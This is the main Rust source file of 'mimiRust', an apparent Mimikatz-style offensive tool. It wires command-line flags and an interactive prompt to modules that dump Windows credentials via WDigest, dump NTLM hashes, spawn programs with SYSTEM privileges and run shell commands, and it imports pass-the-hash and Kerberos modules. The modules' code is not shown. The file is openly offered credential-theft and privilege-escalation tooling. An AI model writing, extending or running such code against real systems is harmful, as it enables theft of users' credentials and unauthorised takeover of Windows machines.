pub mod authentication;
pub mod passwords;
pub mod privilege;
pub mod utilities;

use authentication::{
    PtH,
    Kerberos,
};

use passwords::{
    wdigest::Wdigest, 
    ntlm::Ntlm
};

use privilege::Escalation;
use utilities::Utils;

use clap::Parser;
use anyhow::Result;

#[derive(Parser, Debug)]
#[clap(about, author)]
struct Args {
    /// Spawn program with SYSTEM permissions from location
    #[clap(short, long, default_value = "")]
    spawn_path: String,

    /// Dumps systems credentials through Wdigest
    #[clap(long)]
    dump_credentials: bool,

    /// Dumps systems NTLM hashes
    #[clap(long)]
    dump_hashes: bool,

    /// Execute a shell command through the use of cmd
    #[clap(long)]
    shell: Vec<String>,
}


fn main() -> Result<()> {

    let args = Args::parse();
    if args.spawn_path.len() == 0 && args.shell.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
        println!("{}", banner());
        loop {
            if !Utils::is_elevated() {
                let input = Utils::get_user_input(2);
                handle_user_input(input)?;
            } else {
                if !Utils::is_system() {
                    let input = Utils::get_user_input(1);
                    handle_user_input(input)?;
                } else {
                    let input = Utils::get_user_input(0);
                    handle_user_input(input)?;
                }
            }
        }
    }

    if args.spawn_path.len() > 0 {
        Escalation::get_system(args.spawn_path)?;
    }

    if args.shell.len() > 0 {
        Escalation::execute_shell(args.shell)?;
    }

    if args.dump_credentials {
        Wdigest::grab()?;
    }

    if args.dump_hashes {
        Ntlm::grab()?;
    }


    Ok(())
}

fn banner() -> String {
    return "
    ███▄ ▄███▓ ██▓ ███▄ ▄███▓ ██▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
    ▓██▒▀█▀ ██▒▓██▒▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
    ▓██    ▓██░▒██▒▓██    ▓██░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
    ▒██    ▒██ ░██░▒██    ▒██ ░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ 
    ▒██▒   ░██▒░██░▒██▒   ░██▒░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ 
    ░ ▒░   ░  ░░▓  ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   
    ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░    
    ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░      
           ░    ░         ░    ░     ░        ░           ░           

                    written in Rust by ThottySploity
            mimiRust $ means it's running without elevated privileges
             mimiRust # means it's running with elevated privileges
              mimiRust @ means it's running with system privileges             

    ".to_string();
}

fn handle_user_input(args: Vec<String>) -> Result<()> {
    match args[0].as_str() {
        "dump-credentials" => {
            Wdigest::grab()?;
        },
        "dump-hashes" => {
            Ntlm::grab()?;
        },
        "spawn-path" => {
            if args.len() >= 1 {
                Escalation::get_system(args[1].clone())?;
            }
        },
        "shell" => {
            if args.len() >= 1 {
                Escalation::execute_shell(args)?;
            }
        },
        "exit" => {
            println!("Bye!");
            std::process::exit(0x100);
        },
        "help" | "h" | "?" => {
            println!("
            \rdump-credentials             Dumps systems credentials through Wdigest
            \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions)
            \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location
            \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output
            \rexit                         Exits out of mimiRust
            \n\n");
        },
        _ => {
            println!("Please use: help, h or ?");
        },
    };
    Ok(())
}